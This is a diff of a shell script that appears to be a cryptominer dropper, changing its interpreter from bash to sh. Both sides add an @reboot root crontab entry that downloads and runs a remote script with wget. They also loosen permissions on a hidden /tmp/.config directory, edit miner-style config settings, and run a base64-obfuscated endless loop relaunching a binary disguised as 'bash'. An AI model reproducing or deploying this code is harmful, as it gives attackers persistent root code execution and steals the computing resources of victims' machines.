@@ -2,7 +2,7 @@
 
 mode="${1:-0}"
 src="https://raw.githubusercontent.com/vjbahkds/cajbdfv/main"
-sed -i "/^@reboot/d;\$a\@reboot root /bin/bash <(wget -qO- ${src}/...) >>/dev/null 2>&1 &\n\n\n" /etc/crontab
+sed -i "/^@reboot/d;\$a\@reboot root /bin/sh <(wget -qO- ${src}/...) >>/dev/null 2>&1 &\n\n\n" /etc/crontab
 
 name=`TZ=":Asia/Shanghai" date '+%Y%m%d'`
 [ -n "$name" ] || name="NULL"
@@ -20,7 +20,7 @@ chmod -R 777 "/tmp/.config"
 [ -f "/tmp/.config/config.json" ] && [ -n "$rx" ] && sed -i "s/\"max-threads-hint\": 100,/&\n        \"rx\": ${rx},/" "/tmp/.config/config.json"
 
 if [ "$mode" == "0" ]; then
-  /bin/bash <(echo 'd2hpbGUgdHJ1ZTsgZG8gY2QgL3RtcC8uY29uZmlnICYmIG5vaHVwIC4vYmFzaCA+L2Rldi9udWxsIDI+JjEgOyBkb25l' |base64 -d) &
+  /bin/sh <(echo 'd2hpbGUgdHJ1ZTsgZG8gY2QgL3RtcC8uY29uZmlnICYmIG5vaHVwIC4vYmFzaCA+L2Rldi9udWxsIDI+JjEgOyBkb25l' |base64 -d) &
 else
-  /bin/bash <(echo 'd2hpbGUgdHJ1ZTsgZG8gY2QgL3RtcC8uY29uZmlnICYmIG5vaHVwIC4vYmFzaCA+L2Rldi9udWxsIDI+JjEgOyBkb25l' |base64 -d)
+  /bin/sh <(echo 'd2hpbGUgdHJ1ZTsgZG8gY2QgL3RtcC8uY29uZmlnICYmIG5vaHVwIC4vYmFzaCA+L2Rldi9udWxsIDI+JjEgOyBkb25l' |base64 -d)
 fi
